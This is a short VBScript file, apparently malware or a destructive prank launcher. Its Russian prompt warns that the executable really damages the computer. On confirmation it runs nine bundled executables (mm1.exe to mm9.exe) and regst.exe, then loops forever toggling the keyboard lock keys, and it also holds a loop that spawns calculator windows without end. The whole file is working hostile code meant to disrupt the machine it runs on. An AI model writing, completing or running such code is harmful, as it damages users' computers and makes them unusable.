Dim WshShell
set WshShell = WScript.CreateObject("WScript.Shell")
set kill = createobject("wscript.shell") 
set s = createObject("Wscript.Shell") 
set objShellApp = CreateObject("Shell.Application")
Dim ButtonVybor
ButtonVybor = MsgBox ("Этот исполняемый файл действительно наносит ущерб компьютеру. Вы уверены, что хотите его запустить?", vbYesNo+vbQuestion,"Предупреждение")
If ButtonVybor = 6 Then
	WshShell.Run "mm1.exe"
	WshShell.Run "mm2.exe"
	WshShell.Run "mm3.exe"
	WshShell.Run "mm4.exe"
	WshShell.Run "mm5.exe"
	WshShell.Run "mm6.exe"
	WshShell.Run "mm7.exe"
	WshShell.Run "mm8.exe"
	WshShell.Run "mm9.exe"
	objShellApp.TileHorizontally
	WshShell.Run "regst.exe"
	end if
If ButtonVybor = 6 Then
	do 
	wscript.sleep 80 
	s.sendkeys"{numlock}" 
	wscript.sleep 80 
	s.sendkeys"{capslock}" 
	wscript.sleep 80 
	s.sendkeys"{scrolllock}" 
	wscript.sleep 80 
	s.sendkeys"{numlock}" 
	wscript.sleep 80 
	s.sendkeys"{capslock}" 
	wscript.sleep 80 
	s.sendkeys"{scrolllock}" 
	wscript.sleep 80
	s.sendkeys"{scrolllock}" 
	wscript.sleep 80 
	s.sendkeys"{capslock}" 
	wscript.sleep 80 
	s.sendkeys"{numlock}" 
	wscript.sleep 80
	s.sendkeys"{scrolllock}" 
	wscript.sleep 80 
	s.sendkeys"{capslock}" 
	wscript.sleep 80 
	s.sendkeys"{numlock}" 
	wscript.sleep 80 
	s.sendkeys"{numlock}" 
	wscript.sleep 80 
	s.sendkeys"{capslock}" 
	wscript.sleep 80 
	s.sendkeys"{scrolllock}" 
	wscript.sleep 80 
	loop 
	end if
If ButtonVybor = 6 Then
	do
	WshShell.Run "calc.exe"
	objShellApp.TileHorizontally
	loop
	end if